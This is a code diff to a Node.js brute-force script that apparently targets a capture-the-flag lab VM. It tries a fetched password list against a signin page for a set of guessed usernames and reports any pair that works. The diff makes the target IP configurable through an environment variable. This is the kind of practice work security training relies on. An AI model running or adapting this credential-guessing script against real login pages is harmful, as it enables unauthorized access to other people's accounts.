@@ -7,21 +7,19 @@ async function customFetch(url) {
 }
 
 async function main() {
+  const vmIp = process.env.VM_IP;
+
+  if (!vmIp) {
+    console.error("Usage: node script.js <vm-ip>");
+    process.exit(1);
+  }
+
   const usernames = [
-    //first names
-    "one",
-    "two",
-    "three",
-    "Flag",
-    //surnames
-    "me",
-    "GetThe",
-    //surname + first name
-    "meone",
-    "metwo",
-    "methree",
-    "GetTheFlag",
+    "one", "two", "three", "Flag",
+    "me", "GetThe",
+    "meone", "metwo", "methree", "GetTheFlag",
   ];
+
   const passwords = await customFetch(PASS_URL).then((text) =>
     text.trim().split("\n"),
   );
@@ -30,7 +28,7 @@ async function main() {
     usernames.map(async (username) => {
       for (const password of passwords) {
         const html = await customFetch(
-          `http://172.28.128.136/?page=signin&username=${username}&password=${password}&Login=Login`,
+          `http://${vmIp}/?page=signin&username=${username}&password=${password}&Login=Login`,
         );
         if (!html.includes("WrongAnswer")) {
           console.log(`Correct answer: ${username} ${password}`);
